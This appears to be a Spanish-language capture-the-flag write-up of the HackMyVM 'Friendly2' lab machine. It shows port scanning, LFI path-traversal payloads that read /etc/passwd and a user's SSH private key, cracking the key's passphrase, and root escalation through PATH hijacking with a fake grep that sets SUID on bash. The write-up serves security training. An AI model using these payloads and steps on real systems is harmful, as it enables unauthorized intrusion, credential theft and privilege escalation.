---
layout: post
title : "Friendly2 - HackMyVM"
author : elc4br4
image : /assets/images/HMV/Friendly2-HackMyVM/friendly2.jpg
optimized_image : /assets/images/HMV/Friendly2-HackMyVM/friendly2.jpg
category : [ HackMyVM ]
tags : [ Linux ]
permalink : /HackTheBox/
description : En esta ocasión resolveremos una máquina Easy creada por el compañero Rijaba1 de la plataforma HackMyVM, en la que explotaremos un LFI, craquearemos una clave RSA privada y escalaremos a través de un Path Hijacking.
---

🥶En esta ocasión resolveremos una máquina Easy creada por el compñaero Rijaba1 de la plataforma HackMyVM, en la que explotaremos un LFI, craquearemos una clave RSA privada y escalaremos a través de un Path Hijacking.🥶

### Canal de Rijaba1  
<a href="https://www.youtube.com/@RiJaba1 ">Enlace Canal Youtube Rijaba1</a>

**Un pequeño INDICE**

1. [Reconocimiento](#reconocimiento).
2. [Explotación](#explotación).
4. [Escalada de Privilegios](#privesc). 

# Reconocimiento [#](reconocimiento) {#reconocimiento}

Máquina easy de la plataforma hackmyvm creada por Rijaba1.

Comenzamos realizando un reconocimiento de puertos abiertos en la máquina víctima haciendo uso de la herramienta nmap.

```bash
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Y como se puede ver, solo tenemos el puerto 22 (ssh) y el puerto 80 (http) abiertos.

Pero necesito saber algo más de información acerca de estos puertos, por lo que lanzo un escaneo con nmap un poco más avanzado para descubrir el servicio que corre en cada puerto y su versión.

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 74fdf1a7475bad8e8a3102fe44289fd2 (RSA)
|   256 16f0de5109fffc08a29a69a0ad42a048 (ECDSA)
|_  256 650eed44e23ef0e7600c759363952056 (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Servicio de Mantenimiento de Ordenadores
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Ahora ya podemos ver algo más.

Puerto 22 OpenSSH 8.4p1 y puerto 80 (http) en el que tenemos un Apache httpd 2.4.56.

El título del sitio web es `Servicio de Mantenimiento de Ordenadores`, por lo que vamos a ver que tenemos en el servidor web.

![](/assets/images/HMV/Friendly2-HackMyVM/web1.webp)

Aparentemente no hay nada que me llame la atención, ni en el código fuente... por lo que procedo a fuzzear para descubrir directorios y archivos.

Utilizaré la herramienta wfuzz para este fuzzeo.

```bash
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.0.37/FUZZ
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000000277:   301        9 L      28 W       313 Ch      "assets"                                                                                                               
000000107:   301        9 L      28 W       312 Ch      "tools" 
```

Encuentro la ruta assets en la que hay unas imágenes y la ruta tools que la que encuentro lo siguiente.

![](/assets/images/HMV/Friendly2-HackMyVM/web2.webp)

Pero revisando el código fuente encuentro algo que ya me llama la atención y que me puede servir para explotar la máquina!

```html
<!-- Redimensionar la imagen en check_if_exist.php?doc=keyboard.html -->
```

Me dirijo a la ruta `tools/check_if_exist.php?doc=keyboard.html` y puedo ver una imágen de un teclado con una descripción del mismo.

# Explotación [#](explotación) {#explotación}

Pero lo interesante viene en probar si es posible explotar un LFI.

Para ello tengo un diccionario específico, por lo que haciendo uso del diccionario y de wfuzz podemos comprobar si es posible explotar el LFI.

<a href="https://github.com/danielmiessler/SecLists">Repositorio Seclists</a>

```bash
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.0.37/tools/check_if_exist.php?doc=FUZZ
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000000201:   200        7 L      22 W       189 Ch      "../../../../../../../../../../../../etc/hosts"                                                                        
000000256:   200        26 L     38 W       1369 Ch     "../../../../../../../../../../../../../../../../../../../etc/passwd"                                                  
000000260:   200        26 L     38 W       1369 Ch     "../../../../../../../../../../../../../../../etc/passwd"                                                              
000000253:   200        26 L     38 W       1369 Ch     "../../../../../../../../../../../../../../../../../../../../../../etc/passwd"                                         
000000261:   200        26 L     38 W       1369 Ch     "../../../../../../../../../../../../../../etc/passwd"                                                                 
000000266:   200        26 L     38 W       1369 Ch     "../../../../../../../../../etc/passwd"                                                                                
000000258:   200        26 L     38 W       1369 Ch     "../../../../../../../../../../../../../../../../../etc/passwd"                                                        
000000254:   200        26 L     38 W       1369 Ch     "../../../../../../../../../../../../../../../../../../../../../etc/passwd"                                            
000000249:   200        26 L     38 W       1369 Ch     "/../../../../../../../../../../etc/passwd"                                                                            
000000257:   200        26 L     38 W       1369 Ch     "../../../../../../../../../../../../../../../../../../etc/passwd"                                                     
000000267:   200        26 L     38 W       1369 Ch     "../../../../../../../../etc/passwd"                                                                                   
000000255:   200        26 L     38 W       1369 Ch     "../../../../../../../../../../../../../../../../../../../../etc/passwd"                                               
000000264:   200        26 L     38 W       1369 Ch     "../../../../../../../../../../../etc/passwd"                                                                          
000000262:   200        26 L     38 W       1369 Ch     "../../../../../../../../../../../../../etc/passwd"                                                                    
000000265:   200        26 L     38 W       1369 Ch     "../../../../../../../../../../etc/passwd"                                                                             
000000306:   200        26 L     38 W       1369 Ch     "../../../../../../etc/passwd&=%3C%3C%3C%3C"                                                                           
000000269:   200        26 L     38 W       1369 Ch     "../../../../../../etc/passwd"                                                                                         
000000268:   200        26 L     38 W       1369 Ch     "../../../../../../../etc/passwd"                                                                                      
000000270:   200        26 L     38 W       1369 Ch     "../../../../../etc/passwd"
```

Aquí podemos ver que es posible explotar el LFI y las diferentes formas que tenemos de hacerlo.

Leo el archivo passwd para buscar usuarios.

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
gh0st:x:1001:1001::/home/gh0st:/bin/bash
```

Los usuarios que me interesan son el usuario gh0st y root.

Ahora el siguiente paso es intentar ganar acceso a la máquina, por lo que lo primero que voy a intentar es obtener la clave rsa del usuario gh0st.

`http://192.168.0.37/tools/check_if_exist.php?doc=../../../../../../../../../home/gh0st/.ssh/id_rsa`

Consigo la clave privada rsa y la uso para conectarme vía ssh, pero antes necesitamso obtener la passphrase para poder conectarnos.

Para ello usaré la herrameinta RSAcrack de d4t4s3c.

![](/assets/images/HMV/Friendly2-HackMyVM/rsacrack.webp)

La clave es `celtic`, por lo que ahora ya si que puedo conectarme vía ssh.

```bash
❯ ssh -i id_rsa gh0st@192.168.0.37
Enter passphrase for key 'id_rsa': celtic
Linux friendly2 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
gh0st@friendly2:~$ id; whoami
uid=1001(gh0st) gid=1001(gh0st) groups=1001(gh0st)
gh0st
```

Ya he ganado acceso a la máquina víctima y ya podemos leer la flag de usuario.

A continuación el siguiente paso es escalar privilegios.

# Escalada de Privilegios [#](privesc) {#privesc}

Para ello lanzo el comando `sudo -l` para enumerar permisos de sudo.

```bash
gh0st@friendly2:~$ sudo -l
Matching Defaults entries for gh0st on friendly2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gh0st may run the following commands on friendly2:
    (ALL : ALL) SETENV: NOPASSWD: /opt/security.sh
```

Y como podemos ver, puedo ejecutar el archivo security.sh sin contraseña con cualquier usuario.

Y además de eso puedo editar el PATH.

Pero primero vamos a echarle un vistazo al archivo.

```bash
#!/bin/bash

echo "Enter the string to encode:"
read string

# Validate that the string is no longer than 20 characters
if [[ ${#string} -gt 20 ]]; then
  echo "The string cannot be longer than 20 characters."
  exit 1
fi

# Validate that the string does not contain special characters
if echo "$string" | grep -q '[^[:alnum:] ]'; then
  echo "The string cannot contain special characters."
  exit 1
fi

sus1='A-Za-z'
sus2='N-ZA-Mn-za-m'

encoded_string=$(echo "$string" | tr $sus1 $sus2)

echo "Original string: $string"
echo "Encoded string: $encoded_string"
```

Lo primero que puedo ver es que tenemos comandos sin apuntar a su ruta absoluta, es decir, están usando la ruta relativa... por lo que eso ya me hace pensar que podría estar ante un PATH HIJACKING.

Para explotar este Path Hijacking vamos a crear un archivo, en este caso va a ser grep, con el siguiente contenido.

```bash
gh0st@friendly2:~$ nano grep
gh0st@friendly2:~$ chmod +x grep 
gh0st@friendly2:~$ cat grep 
chmod u+s /bin/bash
```

Una vez creado el archivo grep, vamos a editar el PATH añadiendo el directorio de trabajo donde hemos creado el archivo grep.

Después ejecutamos el archivo security.sh y tirará del grep falso que hemos creado anteriormente, ejecutando el contenido que habíamos introducido otorgando permisos SUID a la bash.

```bash
gh0st@friendly2:~$ sudo PATH=/home/gh0st:$PATH /opt/security.sh 
Enter the string to encode:
hola vulnyx
The string cannot contain special characters.
gh0st@friendly2:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
```
Y ya tendremos la bash con permisos SUID.

Por lo que ya solo debemos ejecutar `bash -p` y seremos root.

```bash
gh0st@friendly2:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
gh0st@friendly2:~$ bash -p
bash-5.1# id
uid=1001(gh0st) gid=1001(gh0st) euid=0(root) groups=1001(gh0st)
bash-5.1# whoami
root
```

Para leer la flag de root tenemos una sorpresilla... os lo dejo a vosotros!!!


